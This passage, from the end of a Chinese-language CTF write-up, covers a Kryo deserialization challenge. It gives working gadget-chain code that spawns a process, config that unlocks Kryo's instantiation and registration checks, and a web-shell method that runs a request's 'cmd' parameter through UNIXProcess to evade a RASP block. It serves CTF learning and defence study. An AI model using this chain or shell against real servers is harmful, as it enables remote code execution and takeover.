        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>

        <span class="n">ToStringBean</span> <span class="n">toStringBean1</span><span class="o">=</span><span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">SignedObject</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">signedObject</span><span class="o">);</span>
        <span class="n">EqualsBean</span> <span class="n">equalsBean1</span><span class="o">=</span><span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="s">"aiwin"</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap1</span><span class="o">=</span><span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">hashMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">equalsBean1</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">equalsBean1</span><span class="o">,</span><span class="s">"_beanClass"</span><span class="o">,</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">equalsBean1</span><span class="o">,</span><span class="s">"_obj"</span><span class="o">,</span><span class="n">toStringBean1</span><span class="o">);</span>

<span class="c1">//        CtClass ctClass=ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");</span>
<span class="c1">//        CtMethod writePlace=ctClass.getDeclaredMethod("writeReplace");</span>
<span class="c1">//        ctClass.removeMethod(writePlace);</span>
<span class="c1">//        ctClass.toClass();</span>
<span class="c1">//        POJONode pojoNode = new POJONode(templates);</span>
<span class="c1">//        HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(1);</span>
<span class="c1">//        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(2);</span>
<span class="c1">//        HashMap hashMap = new HashMap();</span>
<span class="c1">//        hashMap.put(hotSwappableTargetSource, "1");</span>
<span class="c1">//        hashMap.put(hotSwappableTargetSource1, "2");</span>
<span class="c1">//        setFieldValue(hotSwappableTargetSource, "target", pojoNode);</span>
<span class="c1">//        setFieldValue(hotSwappableTargetSource1, "target", new XString("a"));</span>
<span class="c1">//</span>
<span class="c1">//        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");</span>
<span class="c1">//        kpg.initialize(1024);</span>
<span class="c1">//        KeyPair kp = kpg.generateKeyPair();</span>
<span class="c1">//        SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));</span>
<span class="c1">//        POJONode pojoNode1 = new POJONode(signedObject);</span>
<span class="c1">//        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(3);</span>
<span class="c1">//        HotSwappableTargetSource hotSwappableTargetSource3 = new HotSwappableTargetSource(4);</span>
<span class="c1">//        HashMap hashMap1 = new HashMap();</span>
<span class="c1">//        hashMap1.put(hotSwappableTargetSource2, "1");</span>
<span class="c1">//        hashMap1.put(hotSwappableTargetSource3, "2");</span>
<span class="c1">//        setFieldValue(hotSwappableTargetSource2, "target", pojoNode1);</span>
<span class="c1">//        setFieldValue(hotSwappableTargetSource3, "target", new XString("b"));</span>
        <span class="n">Kryo</span> <span class="n">kryo</span><span class="o">=</span><span class="k">new</span> <span class="n">Kryo</span><span class="o">();</span>
        <span class="n">ByteArrayOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
        <span class="n">Output</span> <span class="n">output</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Output</span><span class="o">(</span><span class="n">outputStream</span><span class="o">);</span>
        <span class="n">kryo</span><span class="o">.</span><span class="na">writeClassAndObject</span><span class="o">(</span><span class="n">output</span><span class="o">,</span> <span class="n">hashMap1</span><span class="o">);</span>
        <span class="n">output</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">serializedObject</span> <span class="o">=</span> <span class="n">outputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">base64String</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">serializedObject</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">base64String</span><span class="o">);</span>
        <span class="n">ByteArrayInputStream</span> <span class="n">bas</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">base64String</span><span class="o">));</span>
        <span class="n">Input</span> <span class="n">input</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Input</span><span class="o">(</span><span class="n">bas</span><span class="o">);</span>
        <span class="n">kryo</span><span class="o">.</span><span class="na">readClassAndObject</span><span class="o">(</span><span class="n">input</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchFieldException</span><span class="o">,</span> <span class="n">IllegalAccessException</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">dfield</span><span class="o">=</span><span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
        <span class="n">dfield</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">dfield</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">object</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getTemplates</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">CannotCompileException</span><span class="o">,</span> <span class="n">NotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span><span class="o">=</span><span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">CtClass</span> <span class="n">ctClass</span><span class="o">=</span><span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"Test"</span><span class="o">);</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">));</span>
        <span class="n">String</span> <span class="n">block</span> <span class="o">=</span> <span class="s">"Runtime.getRuntime().exec(\"calc\");"</span><span class="o">;</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">block</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

    <span class="o">}</span>
</pre></div>
<p>随意执行一条链子会发现并不能成功，出现了<code>Class cannot be created (missing no-arg constructor)</code>的报错，报错原因是因为<code>Kyro</code>在反序列化的时候无法指定没有<code>无参构造函数</code>的类。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215212-918c9728-daf7-1.png"/></p>
<p>有没有办法改变这样的一种策略，让它能够实例化没有<code>无参构造函数</code>的类？<code>GPT</code>先生的回答如下：</p>
<ul>
<li>创建自定义的实例化策略类，实现<code>com.esotericsoftware.kryo.InstantiatorStrategy</code>接口</li>
<li>创建自定义的<code>ObjectInstantiator</code>类，实现<code>com.esotericsoftware.kryo.instantiator.ObjectInstantiator</code>接口</li>
<li>通过<code>setInstantiatorStrategy</code>将自定义的实例化策略设置到<code>Kryo</code>对象中</li>
</ul>
<p>所以出题人在<code>/coffee/demo</code>中设置根据输入的<code>json</code>字符来遍历并触发<code>set</code>方法的作用就是为了<code>setInstantiatorStrategy</code>改变策略。这里不可能策略化的类，但是<code>springboot</code>都会带<code>objensis</code>依赖，里面存在<code>org.objenesis.strategy.StdInstantiatorStrategy</code>标准实例化策略，用于实例化对象而无需调用它们的构造函数。</p>
<p>在本地环境打的时候，还是出现了报错<code>Class is not registered</code>，查了一下发现在<code>Kyro</code>中，所有序列化和反序列化用到的<code>Class</code>都要通过<code>register</code>先注册，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215221-967d9fa2-daf7-1.png"/></p>
<p>调试源代码可以发现，<code>Kryo</code>在进行<code>序列化</code>或<code>反序列化</code>的时候会通过<code>getRegistration</code>获取注册的类型从而获取序列化或反序列化器，如果获取不到类型，是无法进行<code>序列化</code>或<code>反序列化</code>的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215230-9c19c27e-daf7-1.png"/></p>
<p>但是这里是能够被绕过的，当它的<code>registrationRequired</code>属性不为<code>True</code>的时候，它就会跳过异常的抛出，因此这里可以通过<code>setRegistrationRequired</code>使其变成<code>false</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215239-a1528f1e-daf7-1.png"/></p>
<p><code>Kyro</code>自带的<code>Registration</code>有<code>19</code>个，都是一些常用的如<code>int double String</code>等定义字符类型的类。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215243-a3e04fb4-daf7-1.png"/></p>
<p>因此整体的解题思路就是先通过<code>/coffee/demo</code>设置<code>Kryo</code>的<code>反序列化策略</code>和<code>RegistrationRequired</code>，最终再通过<code>Kryo</code>反序列化打链子触发<code>RCE</code></p>
<p>需加上的payload内容：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Kryo</span> <span class="n">kryo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Kryo</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">raw</span> <span class="o">=</span> <span class="s">"{\"polish\":\"true\",\"RegistrationRequired\":\"false\", \"InstantiatorStrategy\":\"org.objenesis.strategy.StdInstantiatorStrategy\"}"</span><span class="o">;</span>
        <span class="n">JSONObject</span> <span class="n">serializeConfig</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">(</span><span class="n">raw</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">serializeConfig</span><span class="o">.</span><span class="na">has</span><span class="o">(</span><span class="s">"polish"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">serializeConfig</span><span class="o">.</span><span class="na">getBoolean</span><span class="o">(</span><span class="s">"polish"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">Method</span><span class="o">[]</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">kryo</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethods</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">var3</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var5</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var5</span> <span class="o">&lt;</span> <span class="n">var4</span><span class="o">;</span> <span class="o">++</span><span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">Method</span> <span class="n">setMethod</span> <span class="o">=</span> <span class="n">var3</span><span class="o">[</span><span class="n">var5</span><span class="o">];</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">setMethod</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"set"</span><span class="o">))</span> <span class="o">{</span>
                    <span class="k">try</span> <span class="o">{</span>
                        <span class="n">Object</span> <span class="n">p1</span> <span class="o">=</span> <span class="n">serializeConfig</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">setMethod</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">3</span><span class="o">));</span>
                        <span class="k">if</span> <span class="o">(!</span><span class="n">setMethod</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">()[</span><span class="mi">0</span><span class="o">].</span><span class="na">isPrimitive</span><span class="o">())</span> <span class="o">{</span>
                            <span class="k">try</span> <span class="o">{</span>
                                <span class="n">p1</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">p1</span><span class="o">).</span><span class="na">newInstance</span><span class="o">();</span>
                                <span class="n">setMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">kryo</span><span class="o">,</span> <span class="n">p1</span><span class="o">);</span>
                            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var9</span><span class="o">)</span> <span class="o">{</span>
                                <span class="n">var9</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
                            <span class="o">}</span>
                        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                            <span class="n">setMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">kryo</span><span class="o">,</span> <span class="n">p1</span><span class="o">);</span>
                        <span class="o">}</span>
                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var10</span><span class="o">)</span> <span class="o">{</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
     <span class="c1">//下同</span>
</pre></div>
<p>在<code>rasp</code>中，它这里是把<code>ProcessImpl</code>给<code>ban</code>掉了，但是上文说到，它只禁用了<code>ProcessImpl</code>，可以通过<code>UNIXProcess</code>完成绕过的，最终打入<code>shell</code>即可。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">shell</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.UNIXProcess"</span><span class="o">);</span>

        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredConstructors</span><span class="o">()[</span><span class="mi">0</span><span class="o">];</span>
        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/bin/sh"</span><span class="o">,</span> <span class="s">"-c"</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">prog</span> <span class="o">=</span> <span class="n">toCString</span><span class="o">(</span><span class="n">command</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">argBlock</span> <span class="o">=</span> <span class="n">getArgBlock</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
            <span class="kt">int</span> <span class="n">argc</span> <span class="o">=</span> <span class="n">argBlock</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
            <span class="kt">int</span><span class="o">[]</span> <span class="n">fds</span> <span class="o">=</span> <span class="o">{-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">1</span><span class="o">};</span>
            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">prog</span><span class="o">,</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">argc</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">fds</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
            <span class="n">Method</span> <span class="n">method</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"getInputStream"</span><span class="o">);</span>
            <span class="n">method</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
            <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="o">(</span><span class="n">InputStream</span><span class="o">)</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
            <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
            <span class="kt">int</span>                   <span class="n">a</span>    <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="kt">byte</span><span class="o">[]</span>                <span class="n">b</span>    <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
            <span class="k">while</span> <span class="o">((</span><span class="n">a</span> <span class="o">=</span> <span class="n">is</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">baos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">a</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="n">PrintWriter</span> <span class="n">out</span><span class="o">=</span><span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
            <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">toCString</span><span class="o">(</span><span class="n">String</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">var0</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">var0</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
            <span class="kt">byte</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">var1</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">];</span>
            <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">var1</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">var2</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">var1</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="n">var2</span><span class="o">[</span><span class="n">var2</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
            <span class="k">return</span> <span class="n">var2</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getArgBlock</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">strs</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">assert</span> <span class="n">strs</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">strs</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">;</span>

        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">args</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">strs</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="mi">1</span><span class="o">][];</span>
        <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">strs</span><span class="o">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">].</span><span class="na">getBytes</span><span class="o">();</span>
            <span class="n">size</span> <span class="o">+=</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">length</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">argBlock</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">size</span><span class="o">];</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">var11</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">arg</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">argBlock</span><span class="o">,</span> <span class="n">i</span><span class="o">,</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">arg</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">argBlock</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240305215254-aa9db620-daf7-1.png"/></p>
<blockquote>
<p>这道题质量真的很高，做了好久好久，主要思路就是通过<code>Kyro</code>打反序列化+<code>UNIXProcess或JNI</code>的形式绕过<code>RASP</code></p>
</blockquote>
<h1 data-content="1" id="63e15774e3b385fa28362772efaa9fb1">总结</h1>
<p>文章中<code>JDK17</code>版本绕过反射的是通过<code>Unsafe</code>改变<code>module</code>来进行的，在<code>2021KCon</code>中还看到了<code>InstrumentationImplClass</code>来绕过的。<code>RASP</code>的绕过方式大致可分成两种，一种是通过<code>JNI</code>生成引用的<code>dll或so</code>，一种是寻找更底层的方法。</p>
<p>参考连接：</p>
<p><a href="https://github.com/BeichenDream/Kcon2021Code/blob/master/bypassJdk/JdkSecurityBypass.java" target="_blank">2021KCon</a></p>
<p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md#cshlcl" target="_blank">bookstack</a></p>
<p><a href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" target="_blank">pdnkas</a></p>
<p><a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller" target="_blank">内存马</a></p>
<p><a href="https://github.com/BuptMerak/mrctf-2022-writeups/blob/main/offical/WEB.md" target="_blank">官网WP</a></p>
</div>
</div>